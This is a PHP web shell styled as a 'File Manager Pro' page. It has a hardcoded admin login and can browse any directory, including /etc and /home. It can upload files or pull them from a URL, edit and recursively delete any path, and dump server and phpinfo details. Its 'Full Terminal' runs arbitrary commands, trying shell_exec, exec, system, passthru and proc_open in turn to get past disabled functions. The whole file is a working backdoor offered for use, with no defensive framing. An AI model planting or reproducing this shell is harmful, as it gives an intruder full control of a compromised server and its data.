<?php
/********************************************************************
 *  File Manager
 ********************************************************************/

session_start();
error_reporting(E_ALL);

/* ----------------- LOGIN ----------------- */
$USER = "admin";
$PASS = password_hash("admin46", PASSWORD_DEFAULT);

if (!isset($_SESSION['ok'])) {
    if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['u'], $_POST['p'])) {
        if ($_POST['u'] === $USER && password_verify($_POST['p'], $PASS)) {
            $_SESSION['ok'] = 1;
            header("Location: " . $_SERVER['PHP_SELF']);
            exit;
        } else {
            $login_err = "Invalid username or password.";
        }
    }
    echo '<!doctype html><html><head><meta charset="utf-8"><title>Login</title>
    <style>
      body{margin:0;height:100vh;display:flex;align-items:center;justify-content:center;background:#07070b;color:#e6eef8;font-family:Inter,Segoe UI,Arial;}
      .box{width:360px;padding:28px;border-radius:14px;background:linear-gradient(180deg,rgba(255,255,255,0.02),rgba(0,0,0,0.18));box-shadow:0 10px 40px rgba(0,0,0,0.7), inset 0 1px 0 rgba(255,255,255,0.02);border:1px solid rgba(255,255,255,0.03);}
      h1{margin:0 0 14px 0;font-size:20px;color:#7be3ff;text-align:center;letter-spacing:0.6px}
      label{font-size:12px;color:#9fb8c9}
      input{width:100%;padding:12px;margin-top:8px;border-radius:10px;border:1px solid rgba(255,255,255,0.04);background:rgba(255,255,255,0.02);color:#e6eef8}
      .btn{width:100%;padding:12px;margin-top:14px;border-radius:10px;border:none;background:linear-gradient(90deg,#8affff,#6b6bff);color:#071028;font-weight:700;cursor:pointer;box-shadow:0 6px 24px rgba(107,107,255,0.14)}
      .err{margin-top:10px;color:#ff8080;text-align:center;font-size:13px}
      .hint{margin-top:8px;font-size:12px;color:#7b9bb0;text-align:center}
    </style></head><body>
    <div class="box">
      <h1>FILE MANAGER</h1>
      <form method="POST">
        <label>Username</label>
        <input name="u" required autofocus>
        <label>Password</label>
        <input type="password" name="p" required>
        <button class="btn">Unlock</button>
      </form>';
    if (!empty($login_err)) echo '<div class="err">'.htmlspecialchars($login_err).'</div>';
    echo '<div class="hint">Default: <b>admin</b> / <b>admin</b></div></div></body></html>';
    exit;
}

/* ----------------- PATH (ALLOW ALL DIRECTORIES) ----------------- */
// Default to current directory, but allow any directory access
$dir = $_GET['dir'] ?? __DIR__;
if (!is_dir($dir)) {
    $dir = __DIR__;
}
$ROOT = $dir;

/* ----------------- HELPERS ----------------- */
function hfs($bytes){
    $u=["B","KB","MB","GB","TB"];
    $i=0;
    while($bytes>=1024 && $i < count($u)-1){ $bytes/=1024; $i++; }
    return round($bytes,2).' '.$u[$i];
}
function esc($s){ return htmlspecialchars($s, ENT_QUOTES); }

/* ----------------- NEW: PERMISSIONS HELPER ----------------- */
function get_permissions_color($path) {
    $perms = @fileperms($path);
    if ($perms === false) return "???";
    
    $symbolic = "";
    // Owner
    $symbolic .= ($perms & 0x0100) ? 'r' : '-';
    $symbolic .= ($perms & 0x0080) ? 'w' : '-';
    $symbolic .= ($perms & 0x0040) ? (($perms & 0x0800) ? 's' : 'x') : (($perms & 0x0800) ? 'S' : '-');
    
    // Group
    $symbolic .= ($perms & 0x0020) ? 'r' : '-';
    $symbolic .= ($perms & 0x0010) ? 'w' : '-';
    $symbolic .= ($perms & 0x0008) ? (($perms & 0x0400) ? 's' : 'x') : (($perms & 0x0400) ? 'S' : '-');
    
    // World
    $symbolic .= ($perms & 0x0004) ? 'r' : '-';
    $symbolic .= ($perms & 0x0002) ? 'w' : '-';
    $symbolic .= ($perms & 0x0001) ? (($perms & 0x0200) ? 't' : 'x') : (($perms & 0x0200) ? 'T' : '-');
    
    // Color each character
    $colored = "";
    for ($i = 0; $i < strlen($symbolic); $i++) {
        $char = $symbolic[$i];
        switch($char) {
            case 'r': $colored .= '<span style="color:#6df0ff">r</span>'; break;
            case 'w': $colored .= '<span style="color:#ff6b6b">w</span>'; break;
            case 'x': case 's': case 't': $colored .= '<span style="color:#7bff7b">'.$char.'</span>'; break;
            case '-': $colored .= '<span style="color:#a0a0a0">-</span>'; break;
            case 'S': case 'T': $colored .= '<span style="color:#ffa500">'.$char.'</span>'; break;
            default: $colored .= $char;
        }
    }
    
    return $colored;
}

/* ----------------- ACTIONS ----------------- */

// Upload from URL
if (isset($_POST['url_upload']) && trim($_POST['url_upload']) !== '') {
    $url = trim($_POST['url_upload']);
    $filename = basename(parse_url($url, PHP_URL_PATH));
    
    if (empty($filename) || $filename === '/') {
        $filename = 'downloaded_' . time();
    }
    
    $savePath = $dir . DIRECTORY_SEPARATOR . $filename;
    
    $ctx = stream_context_create([
        'http' => [
            'timeout' => 30,
            'user_agent' => 'Mozilla/5.0'
        ]
    ]);
    
    $data = @file_get_contents($url, false, $ctx);
    
    if ($data !== false) {
        @file_put_contents($savePath, $data);
    }
    
    header("Location:?dir=" . urlencode($dir)); 
    exit;
}

// Create folder
if (isset($_POST['new_folder']) && trim($_POST['new_folder'])!=='') {
    $folderName = basename($_POST['new_folder']);
    $folderPath = $dir . DIRECTORY_SEPARATOR . $folderName;
    if (!file_exists($folderPath)) {
        @mkdir($folderPath, 0755, true);
    }
    header("Location:?dir=" . urlencode($dir)); exit;
}

// Create file
if (isset($_POST['new_file']) && trim($_POST['new_file'])!=='') {
    $fileName = basename($_POST['new_file']);
    $filePath = $dir . DIRECTORY_SEPARATOR . $fileName;
    if (!file_exists($filePath)) {
        @file_put_contents($filePath, "");
    }
    header("Location:?dir=" . urlencode($dir)); exit;
}

// Upload files
if (!empty($_FILES['upload']['name'][0])) {
    foreach ($_FILES['upload']['tmp_name'] as $k => $tmp) {
        $name = basename($_FILES['upload']['name'][$k]);
        @move_uploaded_file($tmp, $dir . DIRECTORY_SEPARATOR . $name);
    }
    header("Location:?dir=" . urlencode($dir)); exit;
}

// Delete file or folder
if (isset($_POST['del_file'])) {
    $p = $_POST['del_file'];
    if (is_file($p)) {
        @unlink($p);
    } elseif (is_dir($p)) {
        // Recursive directory deletion
        $it = new RecursiveDirectoryIterator($p, RecursiveDirectoryIterator::SKIP_DOTS);
        $files = new RecursiveIteratorIterator($it, RecursiveIteratorIterator::CHILD_FIRST);
        foreach($files as $file) {
            if ($file->isDir()){
                @rmdir($file->getRealPath());
            } else {
                @unlink($file->getRealPath());
            }
        }
        @rmdir($p);
    }
    header("Location:?dir=" . urlencode($dir)); exit;
}

// View / Edit
$file_content = '';
$edit_file_path = '';
if (isset($_POST['view_file'])) {
    $p = $_POST['view_file'];
    if (is_file($p)) {
        $file_content = file_get_contents($p);
        $edit_file_path = $p;
    }
}

if (isset($_POST['save_file'])) {
    $p = $_POST['save_file_path'];
    @file_put_contents($p, $_POST['file_content']);
    header("Location:?dir=" . urlencode(dirname($p))); exit;
}

// ZIP current folder
if (isset($_POST['zip_folder'])) {
    $zipname = $dir . DIRECTORY_SEPARATOR . "archive_" . time() . ".zip";
    $zip = new ZipArchive;
    if ($zip->open($zipname, ZipArchive::CREATE)) {
        foreach (scandir($dir) as $f) {
            if ($f == '.' || $f == '..') continue;
            $path = $dir . DIRECTORY_SEPARATOR . $f;
            if (is_file($path)) $zip->addFile($path, $f);
        }
        $zip->close();
    }
    header("Location:?dir=" . urlencode($dir)); exit;
}

// UNZIP
if (isset($_POST['unzip_file'])) {
    $p = $_POST['unzip_file'];
    if (is_file($p)) {
        $zip = new ZipArchive;
        if ($zip->open($p)) {
            $zip->extractTo($dir);
            $zip->close();
        }
    }
    header("Location:?dir=" . urlencode($dir)); exit;
}

// =============================================================================
// FULL TERMINAL - EXECUTE ALL COMMANDS
// =============================================================================

function run_terminal_full($cmd, $workdir) {
    $cmd = trim($cmd);
    if (empty($cmd)) return '';
    
    // Change to working directory
    $original_dir = getcwd();
    chdir($workdir);
    
    $output = '';
    
    // Try multiple execution methods
    if (function_exists('shell_exec')) {
        $output = shell_exec($cmd . ' 2>&1');
    } elseif (function_exists('exec')) {
        $output_array = [];
        exec($cmd . ' 2>&1', $output_array);
        $output = implode("\n", $output_array);
    } elseif (function_exists('system')) {
        ob_start();
        system($cmd . ' 2>&1');
        $output = ob_get_clean();
    } elseif (function_exists('passthru')) {
        ob_start();
        passthru($cmd . ' 2>&1');
        $output = ob_get_clean();
    } elseif (function_exists('proc_open')) {
        $descriptorspec = [
            0 => ["pipe", "r"],
            1 => ["pipe", "w"],
            2 => ["pipe", "w"]
        ];
        
        $process = proc_open($cmd, $descriptorspec, $pipes, $workdir);
        
        if (is_resource($process)) {
            fclose($pipes[0]);
            $output = stream_get_contents($pipes[1]);
            $errors = stream_get_contents($pipes[2]);
            fclose($pipes[1]);
            fclose($pipes[2]);
            proc_close($process);
            
            $output .= $errors;
        }
    } else {
        $output = "Error: No execution functions available";
    }
    
    // Return to original directory
    chdir($original_dir);
    
    return $output ?: "Command executed (no output)";
}

$terminal_output = '';
if (isset($_POST['terminal_cmd'])) {
    $terminal_output = run_terminal_full($_POST['terminal_cmd'], $dir);
}

/* ----------------- MODAL/POPUP HANDLING ----------------- */
$show_server_info = isset($_GET['show_server_info']);
$show_php_info = isset($_GET['show_php_info']);

/* ----------------- HTML UI (DARK CYBERPUNK) ----------------- */
?><!doctype html>
<html lang="en">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>File Manager Pro</title>
<style>
:root{
  --bg:#07070b;
  --panel:#0f1220;
  --muted:#90a3b8;
  --neon-cyan:#6df0ff;
  --neon-mag:#b46cff;
  --accent:#6df0ff;
  --glass: rgba(255,255,255,0.03);
}
*{box-sizing:border-box}
body{margin:0;font-family:Inter,Segoe UI,Arial;background:
radial-gradient(1200px 600px at 10% 10%, rgba(124,58,237,0.06), transparent 6%),
radial-gradient(1000px 500px at 90% 90%, rgba(35,211,243,0.03), transparent 6%),
var(--bg);color:#e6eef8;min-height:100vh}
.container{max-width:1300px;margin:28px auto;padding:18px}
.header{display:flex;align-items:center;justify-content:space-between;gap:12px;margin-bottom:18px;flex-wrap:wrap}
.brand{display:flex;align-items:center;gap:12px}
.logo{width:48px;height:48px;border-radius:10px;background:linear-gradient(135deg,#0ff,#a0f);display:flex;align-items:center;justify-content:center;color:#071028;font-weight:900;font-family:monospace}
.title{font-size:20px;font-weight:700;letter-spacing:0.6px;color:var(--neon-cyan)}
.controls{display:flex;gap:10px;align-items:center;flex-wrap:wrap}

/* Quick Jump Bar */
.jump-bar{display:flex;gap:8px;align-items:center;margin-bottom:14px;padding:12px;background:linear-gradient(180deg, rgba(255,255,255,0.02), rgba(0,0,0,0.25));border-radius:10px;border:1px solid rgba(255,255,255,0.03);flex-wrap:wrap}
.jump-btn{padding:8px 12px;border-radius:8px;border:none;background:linear-gradient(90deg,#2b0b3a,#061023);color:var(--neon-cyan);cursor:pointer;font-weight:600;font-size:13px}
.jump-btn:hover{background:linear-gradient(90deg,#3b1b4a,#071033)}

/* top cards */
.top-row{display:grid;grid-template-columns: 1fr 450px;gap:14px;margin-bottom:14px}
.card{background:linear-gradient(180deg, rgba(255,255,255,0.02), rgba(0,0,0,0.25));border-radius:12px;padding:14px;border:1px solid rgba(255,255,255,0.03);box-shadow: 0 8px 30px rgba(15,20,30,0.5)}
.card h3{margin:0 0 8px 0;color:var(--neon-mag);font-size:15px}
.small{color:var(--muted);font-size:13px}

/* actions grid */
.actions{display:flex;gap:10px;flex-wrap:wrap}
.action-btn{display:inline-flex;align-items:center;gap:10px;padding:10px 14px;border-radius:10px;border:none;background:linear-gradient(90deg,#2b0b3a,#061023);color:var(--neon-cyan);cursor:pointer;font-weight:700;box-shadow:0 8px 30px rgba(75,0,130,0.12);font-size:13px}
.action-btn:hover{transform:translateY(-4px);box-shadow:0 10px 40px rgba(75,0,130,0.18)}
.action-btn .ico{font-size:18px;filter:drop-shadow(0 2px 8px rgba(107,107,255,0.18))}

/* forms */
.form-grid{display:grid;grid-template-columns:1fr 1fr;gap:10px;margin-top:12px}
.input, input[type="file"], select{width:100%;padding:10px;border-radius:10px;border:1px solid rgba(255,255,255,0.04);background:rgba(255,255,255,0.02);color:#e6eef8;font-size:13px}
.input::placeholder{color:var(--muted)}
.btn-neon{background:linear-gradient(90deg,var(--neon-cyan),#7a6bff);border-radius:10px;padding:10px 14px;border:none;color:#071028;font-weight:800;cursor:pointer;box-shadow:0 14px 40px rgba(109,240,255,0.06)}
.btn-danger{background:linear-gradient(90deg,#ff5f7a,#ff9fb4);color:#071028}

/* file table */
.table-wrap{overflow:auto;border-radius:10px}
table{width:100%;border-collapse:collapse;min-width:720px}
th,td{padding:12px 14px;text-align:left;border-bottom:1px solid rgba(255,255,255,0.03)}
th{background:linear-gradient(180deg, rgba(255,255,255,0.01), rgba(0,0,0,0.06));color:var(--muted);font-size:13px}
tr:hover td{background:linear-gradient(90deg, rgba(109,240,255,0.02), rgba(180,108,255,0.01))}
.filename{font-weight:700;color:#ffffff}
.filetype{font-size:13px;color:var(--muted)}
.kv{font-size:13px;color:var(--muted)}
.perms{font-family:monospace;font-size:12px;font-weight:bold}

/* right column: uploader + terminal */
.right-col{display:flex;flex-direction:column;gap:12px}
.uploader{display:flex;flex-direction:column;gap:8px}
.uploader input[type=file]{padding:8px;background:transparent;border:1px dashed rgba(255,255,255,0.04);border-radius:8px;color:var(--muted)}
.upload-actions{display:flex;gap:8px}

/* editor card */
.editor{min-height:160px;padding:12px;border-radius:10px;background:linear-gradient(180deg, rgba(255,255,255,0.02), rgba(0,0,0,0.12));border:1px solid rgba(255,255,255,0.03)}
.editor textarea{width:100%;height:220px;background:transparent;border:none;color:#e6eef8;font-family:Consolas,monospace;resize:vertical;outline:none}

/* terminal */
.terminal{background:#040408;border-radius:10px;padding:12px;color:#aee7ff;height:280px;overflow:auto;font-family:monospace;border:1px solid rgba(109,240,255,0.06);white-space:pre-wrap;font-size:13px}
.terminal .prompt{color:#6df0ff}
.terminal-input{width:100%;padding:12px;border-radius:8px;border:1px solid rgba(255,255,255,0.03);background:#071026;color:#cdefff;margin-top:8px;font-family:monospace}

/* modal styles */
.modal-overlay{position:fixed;top:0;left:0;right:0;bottom:0;background:rgba(0,0,0,0.85);display:flex;align-items:center;justify-content:center;z-index:1000;padding:20px}
.modal-content{background:var(--panel);border-radius:12px;border:1px solid rgba(109,240,255,0.1);max-width:900px;width:100%;max-height:85vh;overflow:auto;box-shadow:0 20px 60px rgba(0,0,0,0.8)}
.modal-header{display:flex;justify-content:space-between;align-items:center;padding:18px;border-bottom:1px solid rgba(255,255,255,0.05)}
.modal-header h3{margin:0;color:var(--neon-cyan)}
.modal-close{background:none;border:none;color:var(--muted);font-size:24px;cursor:pointer;padding:0;width:30px;height:30px;display:flex;align-items:center;justify-content:center}
.modal-close:hover{color:#fff}
.modal-body{padding:18px;font-family:monospace;font-size:13px;color:#cdefff;overflow:auto}
.modal-body table{width:100%;border:none}
.modal-body td{padding:8px 12px;border:none}
.modal-body tr:nth-child(even){background:rgba(255,255,255,0.02)}

/* url upload popup */
.url-upload-popup{position:absolute;top:120px;right:20px;background:linear-gradient(180deg, rgba(255,255,255,0.03), rgba(0,0,0,0.25));border-radius:10px;padding:14px;border:1px solid rgba(255,255,255,0.05);box-shadow:0 15px 40px rgba(0,0,0,0.6);z-index:100;width:400px;backdrop-filter:blur(10px)}
.url-upload-popup h4{margin:0 0 10px 0;color:var(--neon-cyan)}
.url-upload-popup .close-popup{position:absolute;top:8px;right:8px;background:none;border:none;color:var(--muted);cursor:pointer;font-size:18px}

/* responsiveness */
@media(max-width:980px){
  .top-row{grid-template-columns:1fr}
  .form-grid{grid-template-columns:1fr}
  .right-col{order:2}
  .table-wrap{order:1;margin-top:12px}
}
</style>
</head>
<body>
<div class="container">

  <div class="header">
    <div class="brand">
      <div class="logo">FM</div>
      <div>
        <div class="title">File Manager Pro</div>
      </div>
    </div>

    <div class="controls">
      <form method="GET" style="display:flex;gap:8px">
        <input type="text" name="dir" placeholder="Jump to path..." class="input" style="width:380px" value="<?=esc($dir)?>">
        <button class="action-btn" style="padding:10px 16px">🚀 GO</button>
      </form>
      
      <!-- Server Info & PHP Info Buttons -->
      <a href="?dir=<?=urlencode($dir)?>&show_server_info=1" style="text-decoration:none">
        <button class="action-btn" style="background:linear-gradient(90deg,#2b6b0a,#061023)">
          <span class="ico">🖥️</span> Server Info
        </button>
      </a>
      
      <a href="?dir=<?=urlencode($dir)?>&show_php_info=1" style="text-decoration:none">
        <button class="action-btn" style="background:linear-gradient(90deg,#6b2b6b,#061023)">
          <span class="ico">🐘</span> PHP Info
        </button>
      </a>
    </div>
  </div>

  <!-- Quick Jump Bar -->
  <div class="jump-bar">
    <strong style="color:var(--neon-mag);font-size:13px">Quick Jump:</strong>
    <a href="?dir=/" style="text-decoration:none"><button class="jump-btn">📁 /</button></a>
    <a href="?dir=/home" style="text-decoration:none"><button class="jump-btn">🏠 /home</button></a>
    <a href="?dir=/var/www" style="text-decoration:none"><button class="jump-btn">🌐 /var/www</button></a>
    <a href="?dir=/tmp" style="text-decoration:none"><button class="jump-btn">📦 /tmp</button></a>
    <a href="?dir=/etc" style="text-decoration:none"><button class="jump-btn">⚙️ /etc</button></a>
    <a href="?dir=<?=esc(__DIR__)?>" style="text-decoration:none"><button class="jump-btn">📂 Script Dir</button></a>
    <?php if (dirname($dir) !== $dir): ?>
    <a href="?dir=<?=urlencode(dirname($dir))?>" style="text-decoration:none"><button class="jump-btn">⬆️ Parent</button></a>
    <?php endif; ?>
    
    <!-- URL Upload Popup Trigger -->
    <button class="jump-btn" onclick="document.getElementById('urlUploadPopup').style.display='block'" style="background:linear-gradient(90deg,#0a6b6b,#061023)">
      🌐 Upload from URL
    </button>
  </div>

  <!-- URL Upload Popup -->
  <div class="url-upload-popup" id="urlUploadPopup" style="display:none">
    <button class="close-popup" onclick="document.getElementById('urlUploadPopup').style.display='none'">×</button>
    <h4>🌐 Upload from URL</h4>
    <form method="POST" style="display:flex;gap:8px">
      <input class="input" name="url_upload" placeholder="https://example.com/file.zip" style="flex:1" required>
      <button class="btn-neon" type="submit">Download</button>
    </form>
    <div style="margin-top:8px;font-size:12px;color:var(--muted)">
      Enter a direct file URL to download it to current directory.
    </div>
  </div>

  <div class="top-row">
    <!-- LEFT: file list -->
    <div class="card">
      <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:10px">
        <h3>📂 <?=esc(basename($dir) ?: $dir)?></h3>
        <div class="small"><?=esc($dir)?></div>
      </div>

      <div style="display:flex;gap:10px;align-items:center;margin-bottom:8px;flex-wrap:wrap">
        <form method="POST" style="margin:0">
          <button class="action-btn" name="zip_folder" title="Zip current folder"><span class="ico">📦</span> ZIP</button>
        </form>

        <!-- Upload Files Button -->
        <form method="POST" enctype="multipart/form-data" style="margin:0;display:flex;gap:6px">
          <label style="display:inline-flex;gap:8px;align-items:center">
            <input type="file" name="upload[]" multiple style="display:none" id="filepick">
            <button type="button" class="action-btn" onclick="document.getElementById('filepick').click()"><span class="ico">⬆️</span> SELECT FILES</button>
          </label>
          <button class="action-btn btn-neon" type="submit">UPLOAD</button>
        </form>
      </div>

      <!-- Create Folder & File Forms -->
      <div class="form-grid">
        <form method="POST" style="display:flex;gap:8px">
          <input class="input" name="new_folder" placeholder="New folder name" required>
          <button class="btn-neon" type="submit">📁 Create</button>
        </form>

        <form method="POST" style="display:flex;gap:8px">
          <input class="input" name="new_file" placeholder="New file (ex: test.txt)" required>
          <button class="btn-neon" type="submit">📄 Create</button>
        </form>
      </div>

      <div class="table-wrap" style="margin-top:12px">
        <table>
          <thead>
            <tr>
              <th>Name</th>
              <th>Type</th>
              <th>Permissions</th>
              <th>Size</th>
              <th>Action</th>
            </tr>
          </thead>
          <tbody>
            <?php 
            $files = @scandir($dir);
            if ($files === false) $files = [];
            foreach ($files as $f): 
                if ($f=='.' || $f=='..') continue; 
                $p = $dir . DIRECTORY_SEPARATOR . $f; 
            ?>
            <tr>
              <td class="filename"><?=esc($f)?></td>
              <td class="filetype"><?=is_dir($p) ? '📁 Folder' : '📄 File'?></td>
              <td class="perms"><?=get_permissions_color($p)?></td>
              <td class="kv"><?=is_file($p) ? hfs(@filesize($p)) : '-'?></td>
              <td style="white-space:nowrap">
                <?php if (is_dir($p)): ?>
                  <a href="?dir=<?=urlencode($p)?>" style="text-decoration:none"><button class="action-btn" type="button">📂 Open</button></a>
                  <form method="POST" style="display:inline">
                    <input type="hidden" name="del_file" value="<?=esc($p)?>" />
                    <button class="action-btn" style="background:linear-gradient(90deg,#ff6f88,#ff9fb4);margin-left:6px" onclick="return confirm('Delete folder <?=esc($f)?> and all contents?')">🗑</button>
                  </form>
                <?php else: ?>
                  <a href="<?=esc($p)?>" download style="text-decoration:none"><button class="action-btn" type="button">⬇ DL</button></a>
                  <form method="POST" style="display:inline">
                    <input type="hidden" name="view_file" value="<?=esc($p)?>" />
                    <button class="action-btn" style="margin-left:6px">✏️ Edit</button>
                  </form>
                  <form method="POST" style="display:inline">
                    <input type="hidden" name="del_file" value="<?=esc($p)?>" />
                    <button class="action-btn" style="background:linear-gradient(90deg,#ff6f88,#ff9fb4);margin-left:6px" onclick="return confirm('Delete file <?=esc($f)?>?')">🗑</button>
                  </form>
                  <?php if (pathinfo($p, PATHINFO_EXTENSION) === 'zip'): ?>
                    <form method="POST" style="display:inline">
                      <input type="hidden" name="unzip_file" value="<?=esc($p)?>" />
                      <button class="action-btn" style="margin-left:6px">📂 Unzip</button>
                    </form>
                  <?php endif; ?>
                <?php endif; ?>
              </td>
            </tr>
            <?php endforeach; ?>
          </tbody>
        </table>
      </div>
    </div>

    <!-- RIGHT: terminal only (uploader removed) -->
    <div class="right-col">
      <div class="card">
        <h3>💻 Terminal <span style="color:#ff6b6b;font-size:11px">(Full Access)</span></h3>
        <div class="terminal" id="termOutput"><?=esc($terminal_output)?></div>
        <form method="POST" style="margin-top:8px">
          <input class="terminal-input" name="terminal_cmd" placeholder="$ Enter command..." autocomplete="off">
        </form>
      </div>
    </div>
  </div>

  <!-- Editor modal-ish area -->
  <?php if ($file_content !== ''): ?>
  <div class="card editor" id="editorCard">
    <div style="display:flex;justify-content:space-between;align-items:center">
      <div><strong>✏️ Editing:</strong> <?=esc(basename($edit_file_path))?></div>
      <div class="small"><?=esc(dirname($edit_file_path))?></div>
    </div>
    <form method="POST" style="margin-top:10px">
      <textarea name="file_content"><?=esc($file_content)?></textarea>
      <input type="hidden" name="save_file_path" value="<?=esc($edit_file_path)?>">
      <div style="display:flex;gap:8px;justify-content:flex-end;margin-top:10px">
        <button class="btn-neon" name="save_file" type="submit">💾 Save File</button>
        <a href="?dir=<?=urlencode(dirname($edit_file_path))?>" style="text-decoration:none"><button type="button" class="action-btn" style="background:linear-gradient(90deg,#222,#061023);color:var(--neon-cyan)">← Back</button></a>
      </div>
    </form>
  </div>
  <?php endif; ?>

</div>

<!-- Server Info Modal -->
<?php if ($show_server_info): ?>
<div class="modal-overlay" id="serverInfoModal">
  <div class="modal-content">
    <div class="modal-header">
      <h3>🖥️ Server Information</h3>
      <a href="?dir=<?=urlencode($dir)?>"><button class="modal-close">×</button></a>
    </div>
    <div class="modal-body">
      <table>
        <tr><td><strong>Server Software</strong></td><td><?=esc($_SERVER['SERVER_SOFTWARE'] ?? 'N/A')?></td></tr>
        <tr><td><strong>Server Name</strong></td><td><?=esc($_SERVER['SERVER_NAME'] ?? 'N/A')?></td></tr>
        <tr><td><strong>Server Address</strong></td><td><?=esc($_SERVER['SERVER_ADDR'] ?? 'N/A')?></td></tr>
        <tr><td><strong>Server Port</strong></td><td><?=esc($_SERVER['SERVER_PORT'] ?? 'N/A')?></td></tr>
        <tr><td><strong>Document Root</strong></td><td><?=esc($_SERVER['DOCUMENT_ROOT'] ?? 'N/A')?></td></tr>
        <tr><td><strong>Remote Address</strong></td><td><?=esc($_SERVER['REMOTE_ADDR'] ?? 'N/A')?></td></tr>
        <tr><td><strong>Request Method</strong></td><td><?=esc($_SERVER['REQUEST_METHOD'] ?? 'N/A')?></td></tr>
        <tr><td><strong>Request URI</strong></td><td><?=esc($_SERVER['REQUEST_URI'] ?? 'N/A')?></td></tr>
        <tr><td><strong>Script Filename</strong></td><td><?=esc($_SERVER['SCRIPT_FILENAME'] ?? 'N/A')?></td></tr>
        <tr><td><strong>PHP Version</strong></td><td><?=esc(PHP_VERSION)?></td></tr>
        <tr><td><strong>Zend Engine</strong></td><td><?=esc(zend_version())?></td></tr>
        <tr><td><strong>PHP SAPI</strong></td><td><?=esc(PHP_SAPI)?></td></tr>
        <tr><td><strong>Max Execution Time</strong></td><td><?=esc(ini_get('max_execution_time'))?> seconds</td></tr>
        <tr><td><strong>Memory Limit</strong></td><td><?=esc(ini_get('memory_limit'))?></td></tr>
        <tr><td><strong>Upload Max Filesize</strong></td><td><?=esc(ini_get('upload_max_filesize'))?></td></tr>
        <tr><td><strong>Post Max Size</strong></td><td><?=esc(ini_get('post_max_size'))?></td></tr>
        <tr><td><strong>Server OS</strong></td><td><?=esc(PHP_OS)?></td></tr>
        <tr><td><strong>Architecture</strong></td><td><?=esc(PHP_INT_SIZE * 8)?>-bit</td></tr>
        <tr><td><strong>Loaded Extensions</strong></td><td><?=esc(implode(', ', get_loaded_extensions()))?></td></tr>
      </table>
    </div>
  </div>
</div>
<?php endif; ?>

<!-- PHP Info Modal -->
<?php if ($show_php_info): ?>
<div class="modal-overlay" id="phpInfoModal">
  <div class="modal-content">
    <div class="modal-header">
      <h3>🐘 PHP Information</h3>
      <a href="?dir=<?=urlencode($dir)?>"><button class="modal-close">×</button></a>
    </div>
    <div class="modal-body">
      <?php
      ob_start();
      phpinfo();
      $phpinfo = ob_get_clean();
      
      // Extract body content only
      $phpinfo = preg_replace('%^.*<body>(.*)</body>.*$%ms', '$1', $phpinfo);
      
      // Clean up some styles
      $phpinfo = str_replace('class="v"', 'style="color: #6df0ff"', $phpinfo);
      $phpinfo = str_replace('class="e"', 'style="background: rgba(109, 240, 255, 0.05)"', $phpinfo);
      $phpinfo = str_replace('class="h"', 'style="color: #ff6b6b; font-weight: bold"', $phpinfo);
      $phpinfo = str_replace('class="center"', 'style="text-align: center"', $phpinfo);
      
      // Remove tables and add our own styling
      $phpinfo = preg_replace('/<table[^>]*>/', '<table style="width:100%;border:none">', $phpinfo);
      $phpinfo = preg_replace('/<tr[^>]*>/', '<tr>', $phpinfo);
      $phpinfo = preg_replace('/<td[^>]*>/', '<td style="padding:8px 12px;border:none">', $phpinfo);
      
      echo $phpinfo;
      ?>
    </div>
  </div>
</div>
<?php endif; ?>

<script>
// Auto-scroll terminal to bottom
(function(){
  var term = document.getElementById('termOutput');
  if(term) term.scrollTop = term.scrollHeight;
})();

// Close modal on ESC key
document.addEventListener('keydown', function(e) {
  if (e.key === 'Escape') {
    window.location.href = '?dir=<?=urlencode($dir)?>';
  }
});

// Close URL upload popup when clicking outside
window.onclick = function(event) {
  var popup = document.getElementById('urlUploadPopup');
  if (event.target == popup) {
    popup.style.display = "none";
  }
}
</script>
</body>
</html>